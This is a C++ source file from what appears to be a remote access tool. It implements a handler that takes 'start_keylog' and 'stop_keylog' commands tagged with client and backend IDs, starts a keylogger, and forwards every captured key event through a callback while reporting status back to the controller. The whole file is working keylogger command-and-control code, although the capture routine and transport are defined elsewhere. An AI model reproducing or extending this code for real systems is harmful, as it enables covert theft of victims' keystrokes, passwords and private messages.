#include "handlers/KeyloggerCommandHandler.hpp"

namespace handlers {

std::unique_ptr<core::command::ICommand> KeyloggerCommandHandler::parse_command(
    const std::string& cmd,
    const std::string& /*args*/,
    const core::command::CommandContext& ctx
) {
    if (cmd == "start_keylog") {
        uint32_t cid = ctx.client_id;
        uint32_t bid = ctx.backend_id;

        auto on_event = [this, cid, bid](const interfaces::KeyEvent& k) {
            if (event_callback_) {
                event_callback_(cid, bid, k);
            }
        };

        return std::make_unique<StartKeylogCommand>(keylogger_, on_event, ctx);
    }
    else if (cmd == "stop_keylog") {
        return std::make_unique<StopKeylogCommand>(keylogger_, ctx);
    }

    return nullptr;
}

common::EmptyResult StartKeylogCommand::execute() {
    auto res = keylogger_->start(on_event_);
    if (res.is_err()) {
        ctx_.send_error("Keylog", res.error().message);
        return res;
    }

    ctx_.send_status("KEYLOGGER", "STARTED");
    return common::EmptyResult::success();
}

common::EmptyResult StopKeylogCommand::execute() {
    keylogger_->stop();
    ctx_.send_status("KEYLOGGER", "STOPPED");
    return common::EmptyResult::success();
}

} // namespace handlers
